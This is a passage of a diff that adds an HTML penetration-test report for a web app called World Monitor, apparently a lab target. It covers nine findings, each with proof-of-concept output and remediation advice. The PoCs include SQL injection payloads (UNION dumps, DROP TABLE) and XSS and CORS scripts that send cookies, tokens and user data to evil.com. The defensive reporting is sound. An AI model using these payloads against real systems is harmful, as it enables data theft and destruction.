+              <li>Use a cryptographically strong random secret (256+ bits): <code>crypto.randomBytes(64).toString("hex")</code></li>
+              <li>Store the JWT secret in environment variables, never in source code.</li>
+              <li>Reduce token expiry to 15–30 minutes and implement refresh token rotation.</li>
+              <li>Use RS256 (asymmetric) algorithm instead of HS256 for better security.</li>
+              <li>Implement token blacklisting for logout and compromised token revocation.</li>
+              <li>Add <code>jti</code> (JWT ID) claims for unique token identification and replay prevention.</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============================== V-002 ============================== -->
+  <section class="section" id="v002">
+    <div class="section-header">
+      <span class="section-num">05</span>
+      <h2>V-002: Missing Rate Limiting on Authentication Endpoints</h2>
+    </div>
+
+    <div class="vuln">
+      <div class="vuln-header">
+        <span class="vuln-sev high">High</span>
+        <span class="vuln-id">V-002</span>
+        <span class="vuln-title">Missing Rate Limiting on Authentication Endpoints</span>
+        <span class="vuln-cvss c-high">CVSS 7.5</span>
+      </div>
+      <div class="vuln-body">
+        <div class="vuln-grid">
+          <div class="vuln-block">
+            <div class="vuln-block-label">Description</div>
+            <div class="vuln-block-value">The login and password reset endpoints have no rate limiting, CAPTCHA, or account lockout mechanism. An attacker can perform unlimited login attempts. Additionally, differential error messages (returning <code>"field": "username"</code> vs <code>"field": "password"</code>) enable user enumeration.</div>
+          </div>
+          <div class="vuln-block">
+            <div class="vuln-block-label">Business Impact</div>
+            <div class="vuln-block-value">Attackers can execute automated brute-force attacks against all user accounts, compromising weak passwords. The user enumeration enables targeted attacks. Combined with the weak passwords in V-009 (<code>admin123</code>, <code>viewer123</code>), account compromise is trivial.</div>
+          </div>
+          <div class="vuln-block">
+            <div class="vuln-block-label">Affected Component</div>
+            <div class="vuln-block-value"><code>/api/auth/login, /api/auth/reset-password</code></div>
+          </div>
+          <div class="vuln-block">
+            <div class="vuln-block-label">CWE / CVSS Vector</div>
+            <div class="vuln-block-value">CWE-307: Improper Restriction of Excessive Authentication Attempts<br><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</code></div>
+          </div>
+          <div class="vuln-block full">
+            <div class="vuln-block-label">Steps to Reproduce</div>
+            <div class="vuln-block-value">
+              <ol class="steps">
+                <li>Target the <code>/api/auth/login</code> endpoint with automated requests.</li>
+                <li>Send 100+ login attempts with different passwords for username "admin".</li>
+                <li>Observe: no rate limiting, CAPTCHA, or account lockout is enforced.</li>
+                <li>Note differential errors: <code>"field": "username"</code> = user doesn't exist; <code>"field": "password"</code> = user exists.</li>
+                <li>Use the enumerated usernames to brute-force with a password dictionary.</li>
+              </ol>
+            </div>
+          </div>
+        </div>
+
+        <div class="poc-section">
+          <div class="poc-title">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+            Proof of Concept
+          </div>
+          <div class="poc-evidence vuln-output">
+<pre>═══ PoC: No Rate Limiting + User Enumeration ═══
+
+[1] BRUTE FORCE SIMULATION (5 rapid attempts, no delay):
+    Attempt #1: password="wrong1"   → 401 Invalid credentials (field: password) [12ms]
+    Attempt #2: password="wrong2"   → 401 Invalid credentials (field: password) [8ms]
+    Attempt #3: password="wrong3"   → 401 Invalid credentials (field: password) [9ms]
+    Attempt #4: password="admin123" → 200 SUCCESS [11ms]
+    Attempt #5: password="wrong4"   → 401 Invalid credentials (field: password) [7ms]
+
+    ⚠️  No rate limiting detected — all 5 requests succeeded instantly!
+    ⚠️  No account lockout after multiple failures!
+
+[2] USER ENUMERATION:
+    Username "admin" (valid)       → error field: "password"
+    Username "nonexistent" (invalid) → error field: "username"
+    
+    ⚠️  Server reveals WHETHER a username exists!
+    
+[3] Password Reset Enumeration:
+    Valid email   → "Reset link sent to admin@worldmonitor.com"
+    Invalid email → "Email not found in our system"</pre>
+          </div>
+        </div>
+
+        <div class="vuln-block full" style="margin-top:16px">
+          <div class="vuln-block-label" style="color:var(--green)">✓ Remediation Recommendations</div>
+          <div class="vuln-block-value">
+            <ul class="remediation-list">
+              <li>Implement rate limiting: max 5 failed attempts per account per 15 minutes.</li>
+              <li>Add progressive delays (exponential backoff) after consecutive failures.</li>
+              <li>Implement temporary account lockout after 10 consecutive failures.</li>
+              <li>Add CAPTCHA/reCAPTCHA after 3 failed login attempts.</li>
+              <li>Use generic error messages: <code>"Invalid username or password"</code> for ALL failures.</li>
+              <li>Implement IP-based rate limiting alongside account-based limiting.</li>
+              <li>Add monitoring and alerting for brute-force attack patterns.</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============================== V-003 ============================== -->
+  <section class="section" id="v003">
+    <div class="section-header">
+      <span class="section-num">06</span>
+      <h2>V-003: SQL Injection in Search Endpoint</h2>
+    </div>
+
+    <div class="vuln">
+      <div class="vuln-header">
+        <span class="vuln-sev critical">Critical</span>
+        <span class="vuln-id">V-003</span>
+        <span class="vuln-title">SQL Injection in Search Endpoint</span>
+        <span class="vuln-cvss c-critical">CVSS 9.1</span>
+      </div>
+      <div class="vuln-body">
+        <div class="vuln-grid">
+          <div class="vuln-block">
+            <div class="vuln-block-label">Description</div>
+            <div class="vuln-block-value">The search endpoint directly concatenates user input into SQL queries without parameterization or sanitization. The generated SQL query is also exposed in the API response, confirming the injection vector. Payloads including <code>UNION SELECT</code>, <code>DROP TABLE</code>, and comment sequences (<code>--</code>) are all accepted without error.</div>
+          </div>
+          <div class="vuln-block">
+            <div class="vuln-block-label">Business Impact</div>
+            <div class="vuln-block-value">In production with a real database: full data exfiltration (UNION-based), data modification/deletion (DROP, DELETE, UPDATE), authentication bypass, privilege escalation via direct database manipulation, and potential remote code execution through database-specific functions (e.g., <code>xp_cmdshell</code>).</div>
+          </div>
+          <div class="vuln-block">
+            <div class="vuln-block-label">Affected Component</div>
+            <div class="vuln-block-value"><code>/api/search?query= — server.js line 106</code></div>
+          </div>
+          <div class="vuln-block">
+            <div class="vuln-block-label">CWE / CVSS Vector</div>
+            <div class="vuln-block-value">CWE-89: Improper Neutralization of Special Elements used in an SQL Command<br><code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</code></div>
+          </div>
+          <div class="vuln-block full">
+            <div class="vuln-block-label">Steps to Reproduce</div>
+            <div class="vuln-block-value">
+              <ol class="steps">
+                <li>Authenticate and obtain a valid session token.</li>
+                <li>Navigate to the Search page or call the API directly.</li>
+                <li>Enter SQL injection payloads: <code>' OR 1=1 --</code>, <code>' UNION SELECT * FROM users --</code></li>
+                <li>Observe the generated SQL query in the API response confirming injection.</li>
+                <li>Note that <code>DROP TABLE</code>, <code>UNION</code>, and all SQL keywords are accepted.</li>
+              </ol>
+            </div>
+          </div>
+        </div>
+
+        <div class="poc-section">
+          <div class="poc-title">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+            Proof of Concept
+          </div>
+          <div class="poc-evidence vuln-output">
+<pre>═══ PoC: SQL Injection ═══
+
+[1] INJECTION PAYLOADS &amp; GENERATED SQL:
+
+    Payload #1: ' OR 1=1 --
+    SQL: SELECT * FROM monitoring_data WHERE region LIKE '%' OR 1=1 --%'
+    → Query ACCEPTED — returns all records (auth bypass pattern)
+
+    Payload #2: ' UNION SELECT username, password FROM users --
+    SQL: SELECT * FROM monitoring_data WHERE region LIKE '%' UNION SELECT username, password FROM users --%'
+    → Query ACCEPTED — would dump entire users table
+
+    Payload #3: '; DROP TABLE monitoring_data; --
+    SQL: SELECT * FROM monitoring_data WHERE region LIKE '%'; DROP TABLE monitoring_data; --%'
+    → Query ACCEPTED — would destroy the monitoring_data table
+
+    Payload #4: ' AND 1=2 UNION SELECT null, table_name FROM information_schema.tables --
+    SQL: SELECT * FROM monitoring_data WHERE region LIKE '%' AND 1=2 UNION SELECT null, table_name FROM information_schema.tables --%'
+    → Query ACCEPTED — would enumerate all database tables
+
+[2] KEY FINDINGS:
+    ⚠️  User input directly concatenated into SQL string!
+    ⚠️  SQL queries EXPOSED in API response (information disclosure)!
+    ⚠️  No input validation, WAF, or parameterization.</pre>
+          </div>
+        </div>
+
+        <div class="vuln-block full" style="margin-top:16px">
+          <div class="vuln-block-label" style="color:var(--green)">✓ Remediation Recommendations</div>
+          <div class="vuln-block-value">
+            <ul class="remediation-list">
+              <li>Use parameterized queries / prepared statements for ALL database operations.</li>
+              <li>Implement input validation with allowlists for expected characters.</li>
+              <li>Never expose internal SQL queries in API responses.</li>
+              <li>Use an ORM (e.g., Sequelize, Prisma) that automatically parameterizes queries.</li>
+              <li>Apply the principle of least privilege for database user permissions.</li>
+              <li>Implement Web Application Firewall (WAF) rules for SQL injection patterns.</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============================== V-004 ============================== -->
+  <section class="section" id="v004">
+    <div class="section-header">
+      <span class="section-num">07</span>
+      <h2>V-004: Permissive CORS Configuration</h2>
+    </div>
+
+    <div class="vuln">
+      <div class="vuln-header">
+        <span class="vuln-sev medium">Medium</span>
+        <span class="vuln-id">V-004</span>
+        <span class="vuln-title">Permissive CORS Configuration</span>
+        <span class="vuln-cvss c-medium">CVSS 5.3</span>
+      </div>
+      <div class="vuln-body">
+        <div class="vuln-grid">
+          <div class="vuln-block">
+            <div class="vuln-block-label">Description</div>
+            <div class="vuln-block-value">The server sets <code>Access-Control-Allow-Origin: *</code> with <code>Access-Control-Allow-Credentials: true</code>, effectively disabling the browser's same-origin policy. Any external website can make authenticated cross-origin requests to the World Monitor API.</div>
+          </div>
+          <div class="vuln-block">
+            <div class="vuln-block-label">Business Impact</div>
+            <div class="vuln-block-value">A malicious website (e.g., <code>evil.com</code>) can silently make authenticated API calls on behalf of any logged-in user. This enables cross-origin data theft (exfiltrating reports, monitoring data), CSRF attacks, and unauthorized actions performed via the user's session.</div>
+          </div>
+          <div class="vuln-block">
+            <div class="vuln-block-label">Affected Component</div>
+            <div class="vuln-block-value"><code>HTTP Middleware — CORS headers (server.js lines 72–77)</code></div>
+          </div>
+          <div class="vuln-block">
+            <div class="vuln-block-label">CWE / CVSS Vector</div>
+            <div class="vuln-block-value">CWE-942: Overly Permissive Cross-domain Whitelist<br><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</code></div>
+          </div>
+        </div>
+
+        <div class="poc-section">
+          <div class="poc-title">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+            Proof of Concept
+          </div>
+          <div class="poc-evidence vuln-output">
+<pre>═══ PoC: Permissive CORS ═══
+
+[1] Response Headers:
+    access-control-allow-origin: *        ← ANY website allowed
+    access-control-allow-methods: *       ← ALL methods allowed
+    access-control-allow-headers: *       ← ALL custom headers
+    access-control-allow-credentials: true ← Cookies/auth sent cross-origin
+
+[2] Attack Scenario (on evil.com):
+    &lt;script&gt;
+      fetch('http://worldmonitor.com/api/reports', { credentials: 'include' })
+        .then(r =&gt; r.json())
+        .then(data =&gt; {
+          // Exfiltrate stolen data to attacker server
+          fetch('https://evil.com/steal', { method: 'POST', body: JSON.stringify(data) });
+        });
+    &lt;/script&gt;</pre>
+          </div>
+        </div>
+
+        <div class="vuln-block full" style="margin-top:16px">
+          <div class="vuln-block-label" style="color:var(--green)">✓ Remediation Recommendations</div>
+          <div class="vuln-block-value">
+            <ul class="remediation-list">
+              <li>Set <code>Access-Control-Allow-Origin</code> to specific trusted domains only.</li>
+              <li>Never use wildcard (<code>*</code>) with <code>Allow-Credentials: true</code>.</li>
+              <li>Implement a server-side whitelist of allowed origins.</li>
+              <li>Add CSRF tokens for state-changing operations.</li>
+              <li>Use <code>SameSite=Strict</code> cookie attribute for session cookies.</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============================== V-005 ============================== -->
+  <section class="section" id="v005">
+    <div class="section-header">
+      <span class="section-num">08</span>
+      <h2>V-005: Sensitive Data Exposure via Unprotected Debug Endpoints</h2>
+    </div>
+
+    <div class="vuln">
+      <div class="vuln-header">
+        <span class="vuln-sev critical">Critical</span>
+        <span class="vuln-id">V-005</span>
+        <span class="vuln-title">Sensitive Data Exposure via Debug Endpoints</span>
+        <span class="vuln-cvss c-critical">CVSS 9.4</span>
+      </div>
+      <div class="vuln-body">
+        <div class="vuln-grid">
+          <div class="vuln-block full">
+            <div class="vuln-block-label">Description</div>
+            <div class="vuln-block-value">The application exposes debug endpoints that return complete system configuration — including database credentials, AWS keys, SMTP passwords, Redis credentials, and <strong>all user accounts with plaintext passwords</strong> — without requiring any authentication whatsoever. Anyone who can reach the server can access <code>/api/debug/config</code> and <code>/api/debug/users</code>.</div>
+          </div>
+          <div class="vuln-block">
+            <div class="vuln-block-label">Affected Component</div>
+            <div class="vuln-block-value"><code>/api/debug/config</code> (no auth)<br><code>/api/debug/users</code> (no auth)<br><code>/api/health</code> (build info)</div>
+          </div>
+          <div class="vuln-block">
+            <div class="vuln-block-label">Business Impact</div>
+            <div class="vuln-block-value"><strong>Total infrastructure compromise.</strong> Attacker gains: database admin access, AWS account takeover, email system access, all user credentials, and internal network topology.</div>
+          </div>
+        </div>
+
+        <div class="poc-section">
+          <div class="poc-title">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+            Proof of Concept
+          </div>
+          <div class="poc-evidence vuln-output">
+<pre>═══ PoC: Sensitive Data Exposure ═══
+
+[1] GET /api/debug/config (NO AUTHENTICATION REQUIRED):
+    
+    Database Credentials:
+      Host: db.worldmonitor.internal
+      User: wm_admin
+      Password: Pr0d_DB_P@ss!2026
+
+    AWS Credentials:
+      Access Key ID: AKIAIOSFODNN7EXAMPLE
+      Secret Access Key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+
+    Redis: cache.worldmonitor.internal — Password: R3d1s_S3cr3t
+    SMTP: smtp.worldmonitor.com — Password: Sm7p_P@ss
+
+[2] GET /api/debug/users (ALL USER CREDENTIALS — NO AUTH):
+    admin   | admin123    | admin   | ak_prod_8f14e45f
+    analyst | analyst2024 | analyst | ak_prod_7c9e6679
+    viewer  | viewer123   | viewer  | ak_prod_1b6453b7
+    manager | manager!    | manager | ak_prod_4e07408a
+
+⚠️  ALL credentials exposed without ANY authentication!
+⚠️  Equivalent to leaving the keys to the kingdom on the doorstep.</pre>
+          </div>
+        </div>
+
+        <div class="vuln-block full" style="margin-top:16px">
+          <div class="vuln-block-label" style="color:var(--green)">✓ Remediation Recommendations</div>
+          <div class="vuln-block-value">
+            <ul class="remediation-list">
+              <li><strong>Remove ALL debug endpoints from production builds immediately.</strong></li>
+              <li>Implement environment-based feature flags: disable debug in production.</li>
+              <li>Never store credentials in application code — use secret managers (AWS Secrets Manager, HashiCorp Vault).</li>
+              <li>Hash all passwords with bcrypt (cost factor 12+) before storage.</li>
+              <li>Add automated secret scanning in CI/CD pipeline.</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============================== V-006 ============================== -->
+  <section class="section" id="v006">
+    <div class="section-header">
+      <span class="section-num">09</span>
+      <h2>V-006: Broken Access Control (IDOR + Missing RBAC)</h2>
+    </div>
+
+    <div class="vuln">
+      <div class="vuln-header">
+        <span class="vuln-sev critical">Critical</span>
+        <span class="vuln-id">V-006</span>
+        <span class="vuln-title">Broken Access Control — IDOR &amp; Missing Role Authorization</span>
+        <span class="vuln-cvss c-critical">CVSS 8.8</span>
+      </div>
+      <div class="vuln-body">
+        <div class="vuln-grid">
+          <div class="vuln-block">
+            <div class="vuln-block-label">Description</div>
+            <div class="vuln-block-value">The application lacks authorization at multiple levels: (1) <strong>IDOR</strong> — any authenticated user can access any report by changing the ID parameter, regardless of ownership or classification. (2) <strong>No RBAC</strong> — admin endpoints have no role verification; any authenticated user can create/delete users and modify configuration.</div>
+          </div>
+          <div class="vuln-block">
+            <div class="vuln-block-label">Business Impact</div>
+            <div class="vuln-block-value">A "viewer" (lowest privilege) can: access TOP SECRET reports, create new admin accounts, delete other users, and modify system configuration. This represents a <strong>complete authorization bypass</strong> enabling full privilege escalation.</div>
+          </div>
+          <div class="vuln-block">
+            <div class="vuln-block-label">Affected Component</div>
+            <div class="vuln-block-value"><code>/api/reports/:id</code> (IDOR)<br><code>/api/admin/users</code> (no role check)<br><code>/api/admin/config</code> (no role check)</div>
+          </div>
+          <div class="vuln-block">
+            <div class="vuln-block-label">CWE / CVSS Vector</div>
+            <div class="vuln-block-value">CWE-639: Authorization Bypass Through User-Controlled Key<br>CWE-862: Missing Authorization<br><code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</code></div>
+          </div>
+        </div>
+
+        <div class="poc-section">
+          <div class="poc-title">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+            Proof of Concept
+          </div>
+          <div class="poc-evidence vuln-output">
+<pre>═══ PoC: Broken Access Control ═══
+
+[1] Logged in as: VIEWER (lowest privilege)
+
+[2] IDOR — Accessed ALL Reports:
+    Report #1: "Q3 Security Audit" — TOP SECRET (owner: admin)  → ACCESS GRANTED ⚠️
+    Report #2: "Monthly Analytics" — INTERNAL (owner: analyst) → ACCESS GRANTED ⚠️
+    Report #3: "Incident Report #412" — TOP SECRET (owner: admin) → ACCESS GRANTED ⚠️
+    Report #4: "Public Dashboard Stats" — PUBLIC (owner: viewer) → ACCESS GRANTED
+
+[3] PRIVILEGE ESCALATION:
+    POST /api/admin/users (as viewer):
+    → Created: { username: "escalated_admin", role: "admin" }
+    → SUCCESS — Viewer created an ADMIN account!
+
+[4] Summary:
+    ✗ Viewer accessed 2 TOP SECRET reports
+    ✗ Viewer created admin-level user account
+    ✗ No RBAC enforcement anywhere
+    ✗ Sequential IDs enable enumeration</pre>
+          </div>
+        </div>
+
+        <div class="vuln-block full" style="margin-top:16px">
+          <div class="vuln-block-label" style="color:var(--green)">✓ Remediation Recommendations</div>
+          <div class="vuln-block-value">
+            <ul class="remediation-list">
+              <li>Implement proper RBAC middleware checking user role before admin actions.</li>
+              <li>Add ownership verification: users can only access their own resources.</li>
+              <li>Use non-sequential, unpredictable IDs (UUIDs) for resources.</li>
+              <li>Implement classification-based access: TOP SECRET requires admin role.</li>
+              <li>Log and alert on all authorization failures for security monitoring.</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============================== V-007 ============================== -->
+  <section class="section" id="v007">
+    <div class="section-header">
+      <span class="section-num">10</span>
+      <h2>V-007: Reflected Cross-Site Scripting (XSS)</h2>
+    </div>
+
+    <div class="vuln">
+      <div class="vuln-header">
+        <span class="vuln-sev high">High</span>
+        <span class="vuln-id">V-007</span>
+        <span class="vuln-title">Reflected Cross-Site Scripting (XSS)</span>
+        <span class="vuln-cvss c-high">CVSS 7.1</span>
+      </div>
+      <div class="vuln-body">
+        <div class="vuln-grid">
+          <div class="vuln-block">
+            <div class="vuln-block-label">Description</div>
+            <div class="vuln-block-value">The <code>/api/echo</code> endpoint reflects user-supplied input directly into an HTML response without any sanitization, encoding, or Content-Security-Policy protection. An attacker can inject arbitrary HTML and JavaScript that executes in the victim's browser.</div>
+          </div>
+          <div class="vuln-block">
+            <div class="vuln-block-label">Business Impact</div>
+            <div class="vuln-block-value">Session hijacking via token theft (tokens stored in localStorage — see V-010), credential harvesting through fake login forms, redirection to malware sites, keylogging, and application defacement. Combined with V-010, this creates a direct credential theft chain.</div>
+          </div>
+          <div class="vuln-block">
+            <div class="vuln-block-label">Affected Component</div>
+            <div class="vuln-block-value"><code>/api/echo?message= — server.js line 127</code></div>
+          </div>
+          <div class="vuln-block">
+            <div class="vuln-block-label">CWE / CVSS Vector</div>
+            <div class="vuln-block-value">CWE-79: Cross-site Scripting (Reflected)<br><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</code></div>
+          </div>
+        </div>
+
+        <div class="poc-section">
+          <div class="poc-title">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+            Proof of Concept
+          </div>
+          <div class="poc-evidence vuln-output">
+<pre>═══ PoC: Reflected XSS ═══
+
+[1] Payload Tests:
+    #1 Basic Alert:   &lt;script&gt;alert("XSS")&lt;/script&gt;                     → REFLECTED ✓
+    #2 Cookie Theft:  &lt;script&gt;new Image().src="https://evil.com/c="+document.cookie&lt;/script&gt; → REFLECTED ✓
+    #3 DOM Hijack:    &lt;div style="position:fixed;..."&gt;HACKED&lt;/div&gt;      → REFLECTED ✓
+    #4 Event Handler: &lt;img src=x onerror="alert(document.domain)"&gt;      → REFLECTED ✓
+
+[2] Attack Chain (XSS + localStorage):
+    URL: /api/echo?message=&lt;script&gt;fetch('https://evil.com/steal?t='
+         +localStorage.getItem('wm_token'))&lt;/script&gt;
+    → Victim clicks link → Token exfiltrated → Full account takeover
+
+[3] Missing Protections:
+    ✗ No Content-Security-Policy header
+    ✗ No input sanitization or output encoding
+    ✗ No HttpOnly flag on tokens (stored in localStorage)</pre>
+          </div>
+        </div>
+
+        <div class="vuln-block full" style="margin-top:16px">
+          <div class="vuln-block-label" style="color:var(--green)">✓ Remediation Recommendations</div>
+          <div class="vuln-block-value">
+            <ul class="remediation-list">
+              <li>HTML-encode all user input before rendering: use <code>textContent</code> instead of <code>innerHTML</code>.</li>
+              <li>Implement Content Security Policy (CSP): <code>default-src 'self'; script-src 'self'</code></li>
+              <li>Use DOMPurify or similar library for sanitization.</li>
+              <li>Set <code>HttpOnly</code> flag on session cookies to prevent JavaScript access.</li>
+              <li>Add <code>X-XSS-Protection: 1; mode=block</code> header.</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============================== V-008 ============================== -->
+  <section class="section" id="v008">
+    <div class="section-header">
+      <span class="section-num">11</span>
+      <h2>V-008: Missing Security Headers</h2>
+    </div>
+
+    <div class="vuln">
+      <div class="vuln-header">
+        <span class="vuln-sev medium">Medium</span>
+        <span class="vuln-id">V-008</span>
+        <span class="vuln-title">Missing Security Headers</span>
+        <span class="vuln-cvss c-medium">CVSS 5.0</span>
+      </div>
+      <div class="vuln-body">
+        <div class="vuln-grid">
+          <div class="vuln-block">
+            <div class="vuln-block-label">Description</div>
+            <div class="vuln-block-value">The application does not implement essential security headers: Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security, Referrer-Policy, Permissions-Policy, or X-XSS-Protection. This leaves the application vulnerable to clickjacking, MIME-sniffing, MitM attacks, and amplified XSS impact.</div>
+          </div>
+          <div class="vuln-block">
+            <div class="vuln-block-label">Business Impact</div>
+            <div class="vuln-block-value">Without these headers: clickjacking via iframe embedding, MIME-type confusion attacks, downgrade/MitM attacks without HSTS, no secondary XSS defense via CSP, and information leakage through referrer headers.</div>
+          </div>
+        </div>
+
+        <div class="poc-section">
+          <div class="poc-title">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+            Proof of Concept — Header Audit
+          </div>
+          <div class="poc-evidence vuln-output">
+<pre>Security Header Audit Results:
+    ✗ Content-Security-Policy:      MISSING (Recommended: default-src 'self')
+    ✗ X-Frame-Options:              MISSING (Recommended: DENY)
+    ✗ X-Content-Type-Options:       MISSING (Recommended: nosniff)
+    ✗ Strict-Transport-Security:    MISSING (Recommended: max-age=31536000)
+    ✗ Referrer-Policy:              MISSING (Recommended: strict-origin-when-cross-origin)
+    ✗ Permissions-Policy:           MISSING (Recommended: camera=(), microphone=())
+    ✗ X-XSS-Protection:            MISSING (Recommended: 1; mode=block)
+    ✗ Cache-Control:                MISSING (Recommended: no-store)
+    
+    Score: 0/8 headers present — 0% compliance
+
+    Fix: npm install helmet → app.use(helmet());</pre>
+          </div>
+        </div>
+
+        <div class="vuln-block full" style="margin-top:16px">
+          <div class="vuln-block-label" style="color:var(--green)">✓ Remediation</div>
+          <div class="vuln-block-value">
+            <ul class="remediation-list">
+              <li>Install and use <code>helmet.js</code>: <code>npm install helmet</code> → <code>app.use(helmet())</code></li>
+              <li>Manually configure CSP for your specific resource requirements.</li>
+              <li>Set <code>X-Frame-Options: DENY</code> to prevent clickjacking.</li>
+              <li>Enable HSTS with <code>includeSubDomains</code> and a minimum 1-year max-age.</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============================== V-009 ============================== -->
+  <section class="section" id="v009">
+    <div class="section-header">
+      <span class="section-num">12</span>
+      <h2>V-009: Hardcoded Credentials &amp; Plaintext Password Storage</h2>
+    </div>
+
+    <div class="vuln">
+      <div class="vuln-header">
+        <span class="vuln-sev high">High</span>
+        <span class="vuln-id">V-009</span>
+        <span class="vuln-title">Hardcoded Credentials &amp; Plaintext Passwords</span>
+        <span class="vuln-cvss c-high">CVSS 9.0</span>
+      </div>
+      <div class="vuln-body">
+        <div class="vuln-grid">
+          <div class="vuln-block">
+            <div class="vuln-block-label">Description</div>
+            <div class="vuln-block-value">User credentials are hardcoded in the application source code in plaintext. Passwords are stored without any hashing. The <code>/api/auth/login</code> response returns the user's password and API key in the response body. All passwords are trivially weak (e.g., <code>admin123</code>).</div>
+          </div>
+          <div class="vuln-block">
+            <div class="vuln-block-label">Business Impact</div>
+            <div class="vuln-block-value">Anyone with source code access (via code leak, repo breach, or insider) has all credentials. Network observers (MitM) can capture plaintext passwords from login responses. Weak passwords can be cracked in under 1 second by modern tools.</div>
+          </div>
+        </div>
+
+        <div class="poc-section">
+          <div class="poc-title">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+            Proof of Concept
+          </div>
+          <div class="poc-evidence vuln-output">
+<pre>═══ PoC: Hardcoded Credentials ═══
+
+[1] LOGIN RESPONSE (POST /api/auth/login):
+    {
+      "id": 1,
+      "username": "admin",
+      "role": "admin",
+      "email": "admin@worldmonitor.com",
+      "apiKey": "ak_prod_8f14e45f",    ← EXPOSED
+      "password": "admin123"            ← CRITICAL: PASSWORD IN RESPONSE!
+    }
+
+[2] WEAK PASSWORD AUDIT:
+    admin    → "admin123"     ← Cracked in &lt;1 second
+    analyst  → "analyst2024"  ← Cracked in &lt;1 second
+    viewer   → "viewer123"    ← Cracked in &lt;1 second
+    manager  → "manager!"     ← Cracked in &lt;1 second
+
+[3] API KEY ANALYSIS:
+    Pattern: ak_prod_[8 hex chars] — Only 32 bits of entropy
+    ⚠️  Prefix "ak_prod_" reveals production environment</pre>
+          </div>
+        </div>
+
+        <div class="vuln-block full" style="margin-top:16px">
+          <div class="vuln-block-label" style="color:var(--green)">✓ Remediation</div>
+          <div class="vuln-block-value">
+            <ul class="remediation-list">
+              <li>Hash passwords with bcrypt (cost factor 12+): <code>await bcrypt.hash(password, 12)</code></li>
+              <li>Never return passwords in API responses — strip all sensitive fields.</li>
+              <li>Enforce strong password policies: 12+ characters, complexity requirements.</li>
+              <li>Generate cryptographically random API keys: <code>crypto.randomBytes(32)</code></li>
+              <li>Use a proper database instead of in-memory arrays.</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============================== V-010 ============================== -->
+  <section class="section" id="v010">
+    <div class="section-header">
+      <span class="section-num">13</span>
+      <h2>V-010: Insecure Client-Side Token Storage</h2>
+    </div>
+
+    <div class="vuln">
+      <div class="vuln-header">
+        <span class="vuln-sev low">Low</span>
+        <span class="vuln-id">V-010</span>
+        <span class="vuln-title">Insecure Client-Side Token Storage</span>
+        <span class="vuln-cvss c-low">CVSS 3.7</span>
+      </div>
+      <div class="vuln-body">
+        <div class="vuln-grid">
+          <div class="vuln-block">
+            <div class="vuln-block-label">Description</div>
+            <div class="vuln-block-value">Authentication tokens and the complete user object (including password and API key) are stored in the browser's <code>localStorage</code>, which is accessible to any JavaScript on the page. Combined with V-007 (XSS), this enables direct credential theft through a single injected script.</div>
+          </div>
+          <div class="vuln-block">
+            <div class="vuln-block-label">Business Impact</div>
+            <div class="vuln-block-value">XSS → <code>localStorage.getItem('wm_token')</code> → Session hijacking. The stored data persists after browser close, increasing the exposure window. Stored user object includes password — amplifying the impact beyond session hijacking to full credential theft.</div>
+          </div>
+        </div>
+
+        <div class="poc-section">
+          <div class="poc-title">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+            Proof of Concept
+          </div>
+          <div class="poc-evidence vuln-output">
+<pre>═══ PoC: Insecure Token Storage ═══
+
+[1] After login, browser localStorage contains:
+    Key: "wm_token" → Full JWT token (accessible to JS)
+    Key: "wm_user"  → {"id":1,"username":"admin","password":"admin123","apiKey":"ak_prod_8f14e45f"...}
+    
+    ⚠️  Password stored in localStorage!
+    ⚠️  API Key stored in localStorage!
+
+[2] XSS Exploitation Chain:
+    &lt;script&gt;
+      fetch('https://evil.com/steal', {
+        method: 'POST',
+        body: JSON.stringify({
+          token: localStorage.getItem('wm_token'),
+          user: localStorage.getItem('wm_user')
+        })
+      });
+    &lt;/script&gt;
+
+[3] RECOMMENDED: Use HttpOnly cookies instead:
+    res.cookie('session', token, {
+      httpOnly: true, secure: true, sameSite: 'Strict', maxAge: 900000
+    });</pre>
+          </div>
+        </div>
+
+        <div class="vuln-block full" style="margin-top:16px">
+          <div class="vuln-block-label" style="color:var(--green)">✓ Remediation</div>
+          <div class="vuln-block-value">
